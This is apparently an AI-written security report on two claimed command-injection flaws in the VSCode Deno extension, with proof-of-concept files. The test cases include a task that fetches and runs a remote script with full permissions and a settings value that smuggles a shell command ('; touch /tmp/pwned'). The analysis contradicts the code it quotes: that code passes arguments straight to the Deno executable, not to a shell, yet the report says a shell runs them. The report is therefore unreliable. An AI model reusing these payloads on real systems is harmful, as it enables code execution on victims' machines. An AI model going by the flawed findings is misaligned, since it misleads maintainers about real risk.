Based on your instructions, here is the updated list of vulnerabilities in markdown format. Both provided vulnerabilities are considered valid for inclusion based on the given criteria:

### Vulnerability List:

- **Vulnerability Name:** Command Injection via Deno Tasks

- **Description:**
    - A threat actor can create a malicious repository containing a `.vscode/tasks.json` file.
    - When a victim opens this repository in VSCode with the Deno extension enabled, and configures tasks, the malicious tasks from `.vscode/tasks.json` will be registered.
    - If the victim executes one of these malicious tasks (either manually or via tasks sidebar), the `command` and `args` defined in the malicious `tasks.json` will be executed by the system shell.
    - This allows the attacker to achieve arbitrary command execution on the victim's machine.

- **Impact:**
    - Remote Code Execution (RCE). An attacker can execute arbitrary commands on the victim's machine with the privileges of the VSCode process. This can lead to complete system compromise, data exfiltration, malware installation, and other malicious activities.

- **Vulnerability Rank:** Critical

- **Currently Implemented Mitigations:**
    - None. The extension directly executes commands defined in `tasks.json` without sanitization.

- **Missing Mitigations:**
    - Input sanitization and validation for `command` and `args` in task definitions.
    - Sandboxing or isolation for task execution to limit the impact of command injection.
    - User awareness and warnings about executing tasks from untrusted repositories.

- **Preconditions:**
    - Victim must have VSCode with the Deno extension installed and enabled.
    - Victim must open a malicious repository containing a crafted `.vscode/tasks.json` file.
    - Victim must execute a malicious task, either manually or from the tasks sidebar.

- **Source Code Analysis:**
    1. **`vscode_deno\docs\tasks.md`**: This document describes how to define tasks in `tasks.json`. It shows that the `DenoTaskDefinition` interface includes `command` and `args` fields, which are directly used to execute commands.
    2. **`vscode_deno\client\src\tasks.ts`**: The `buildDenoTask` function constructs a `vscode.Task` object.
        ```typescript
        export function buildDenoTask(
          target: vscode.WorkspaceFolder,
          process: string,
          definition: DenoTaskDefinition,
          name: string,
          args: string[],
          problemMatchers: string[],
        ): vscode.Task {
          const exec = new vscode.ProcessExecution(
            process, // Deno executable path
            args,    // Arguments to the deno executable
            definition,
          );

          return new vscode.Task(
            definition,
            target,
            name,
            TASK_SOURCE,
            exec,  // ProcessExecution with command and args
            problemMatchers,
          );
        }
        ```
        - `buildDenoTask` takes `DenoTaskDefinition` as input, which directly includes `command` and `args` from the `tasks.json`.
        - It creates a `vscode.ProcessExecution` using the provided `process` (Deno executable path) and `args`.
        - The `vscode.Task` is then created using this `ProcessExecution`.
    3. **`vscode_deno\client\src\tasks_sidebar.ts`**: `DenoTasksTreeDataProvider` is responsible for displaying tasks in the sidebar and handling task execution.
        ```typescript
        class DenoTask extends TreeItem {
          constructor(
            public denoJson: DenoJSON,
            public task: Task, // vscode.Task object created by buildDenoTask
          ) {
            // ...
          }
        }

        export class DenoTasksTreeDataProvider implements TreeDataProvider<TreeItem> {
          // ...
          #runTask(task: DenoTask) {
            tasks.executeTask(task.task); // Executing the vscode.Task
          }
          // ...
        }
        ```
        - `DenoTask` holds a `vscode.Task` object.
        - `#runTask` method in `DenoTasksTreeDataProvider` directly executes the `vscode.Task` object using `vscode.tasks.executeTask()`.

    **Visualization:**

    ```
    Malicious Repository (.vscode/tasks.json) --> Victim Opens Repository in VSCode --> Deno Extension Reads tasks.json --> Creates vscode.Task objects (with malicious command/args) --> Victim Executes Malicious Task --> vscode.tasks.executeTask() --> System Shell Executes Malicious Command
    ```

- **Security Test Case:**
    1. Create a new folder named `vscode_deno_task_poc`.
    2. Inside `vscode_deno_task_poc`, create a subfolder named `.vscode`.
    3. Inside `.vscode`, create a file named `tasks.json` with the following content:
        ```json
        {
          "version": "2.0.0",
          "tasks": [
            {
              "type": "deno",
              "command": "run",
              "args": [
                "-A",
                "--unstable",
                "https://raw.githubusercontent.com/username/repo/main/malicious_script.ts"
              ],
              "label": "Malicious Task - Command Injection POC"
            },
            {
              "type": "deno",
              "command": "sh",
              "args": [
                  "-c",
                  "echo 'Vulnerability Found!' > /tmp/vulnerability.txt"
              ],
              "label": "Malicious Task - OS Command Injection"
            }
          ]
        }
        ```
        **Note**: Replace `https://raw.githubusercontent.com/username/repo/main/malicious_script.ts` with a publicly accessible URL to a harmless Deno script for testing (e.g., `https://gist.githubusercontent.com/kitsonk/995849b6978c7dd8899b5a8c58f2782d/raw/helloworld.ts`). For the second task, the command injection will attempt to create `/tmp/vulnerability.txt`, adjust the path based on your OS if needed.
    4. Open VSCode and open the `vscode_deno_task_poc` folder.
    5. Ensure the Deno extension is enabled for this workspace (you might need to run "Deno: Enable").
    6. Open the Command Palette (`Ctrl+Shift+P` or `Cmd+Shift+P`) and run "Tasks: Run Task".
    7. Select "Malicious Task - Command Injection POC" or "Malicious Task - OS Command Injection" from the list.
    8. Observe that the task executes. For the first task, the Deno script from the provided URL will be executed with `-A` and `--unstable` flags. For the second task, check if the file `/tmp/vulnerability.txt` is created (or the equivalent command was executed based on your malicious command).
    9. **Expected Result:** The malicious task executes, demonstrating command injection. For the second task, the file `/tmp/vulnerability.txt` should be created, proving arbitrary OS command execution.

- **Vulnerability Name:** Command Injection via Deno Test CodeLens Arguments

- **Description:**
    - A threat actor can create a malicious repository containing a `.vscode/settings.json` file with crafted `deno.codeLens.testArgs`.
    - When a victim opens this repository in VSCode with the Deno extension enabled, the malicious `deno.codeLens.testArgs` will be loaded from `.vscode/settings.json`.
    - If the victim uses the "Run Test" code lens in a Deno test file within this repository, the malicious arguments from `deno.codeLens.testArgs` will be appended to the `deno test` command.
    - This allows the attacker to inject arbitrary command-line arguments into the `deno test` command, potentially leading to command injection and arbitrary code execution.

- **Impact:**
    - Remote Code Execution (RCE). An attacker can inject malicious arguments into the `deno test` command, potentially leading to arbitrary command execution on the victim's machine via specially crafted arguments or flags.

- **Vulnerability Rank:** High

- **Currently Implemented Mitigations:**
    - None. The extension directly uses the `deno.codeLens.testArgs` setting without sanitization.

- **Missing Mitigations:**
    - Input sanitization and validation for `deno.codeLens.testArgs` setting.
    - Limiting the allowed arguments for `deno test` executed via code lens.
    - User awareness and warnings about running tests from untrusted repositories.

- **Preconditions:**
    - Victim must have VSCode with the Deno extension installed and enabled.
    - Victim must open a malicious repository containing a crafted `.vscode/settings.json` file.
    - Victim must have a Deno test file in the workspace.
    - Victim must use the "Run Test" code lens on a test within the malicious repository.

- **Source Code Analysis:**
    1. **`vscode_deno\docs\testing.md`**: This document describes the `deno.codeLens.testArgs` setting, allowing users to configure additional arguments for the test command.
    2. **`vscode_deno\client\src\commands.ts`**: The `test` command handler in `commands.ts` retrieves `deno.codeLens.testArgs` from the workspace configuration and directly appends them to the `deno test` command.
        ```typescript
        export function test(
          _context: vscode.ExtensionContext,
          extensionContext: DenoExtensionContext,
        ): Callback {
          return async (uriStr: string, name: string, options: TestCommandOptions) => {
            // ...
            const config = vscode.workspace.getConfiguration(EXTENSION_NS, uri);
            const testArgs: string[] = [
              ...(config.get<string[]>("codeLens.testArgs") ?? []), // Retrieving codeLens.testArgs
            ];
            // ...
            const args = ["test", ...testArgs, "--filter", nameRegex, filePath]; // Appending testArgs to the command
            // ...
          };
        }
        ```
        - The code retrieves the `deno.codeLens.testArgs` array from the workspace configuration.
        - It directly includes these arguments into the `args` array that is used to execute the `deno test` command.

    **Visualization:**

    ```
    Malicious Repository (.vscode/settings.json with malicious deno.codeLens.testArgs) --> Victim Opens Repository in VSCode --> Deno Extension Reads settings.json --> Victim Clicks "Run Test" CodeLens --> test command handler uses malicious deno.codeLens.testArgs --> System Shell Executes Deno Test Command with Injected Arguments
    ```

- **Security Test Case:**
    1. Create a new folder named `vscode_deno_test_codelens_poc`.
    2. Inside `vscode_deno_test_codelens_poc`, create a subfolder named `.vscode`.
    3. Inside `.vscode`, create a file named `settings.json` with the following content:
        ```json
        {
          "deno.codeLens.testArgs": [
            "--allow-read",
            "--allow-write",
            "--allow-net",
            "--allow-env",
            "--allow-sys",
            "--allow-hrtime",
            "--allow-plugin",
            "--unstable",
            "; touch /tmp/pwned ; #"
          ]
        }
        ```
        **Note**: The malicious argument `; touch /tmp/pwned ; #` is designed to attempt command injection. Adjust the command based on your OS if needed.
    4. Inside `vscode_deno_test_codelens_poc`, create a file named `test_file.ts` with the following content:
        ```typescript
        Deno.test("Vulnerability Test", () => {
          console.log("Test running...");
        });
        ```
    5. Open VSCode and open the `vscode_deno_test_codelens_poc` folder.
    6. Ensure the Deno extension is enabled for this workspace.
    7. Open `test_file.ts`. You should see the "Run Test" code lens above the `Deno.test` definition.
    8. Click on the "Run Test" code lens.
    9. Check if the file `/tmp/pwned` is created after the test execution.
    10. **Expected Result:** The file `/tmp/pwned` should be created, indicating that the malicious arguments from `deno.codeLens.testArgs` were successfully injected and executed, leading to command injection.
